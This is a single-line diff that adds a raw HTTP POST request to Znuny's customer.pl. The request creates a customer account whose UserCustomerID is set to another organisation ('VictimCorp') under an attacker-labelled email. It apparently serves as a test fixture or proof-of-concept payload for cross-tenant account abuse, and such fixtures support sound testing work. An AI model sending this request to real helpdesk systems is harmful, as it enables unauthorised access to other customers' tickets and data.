@@ -1,0 +1,1 @@
+POST /znuny/customer.pl  Action=CustomerCreateAccount;Subaction=CreateAccount;UserFirstname=Mal;UserLastname=Lory;UserEmail=attacker_9e6bfb3b@example.test;UserCustomerID=VictimCorp-9e6bfb3b
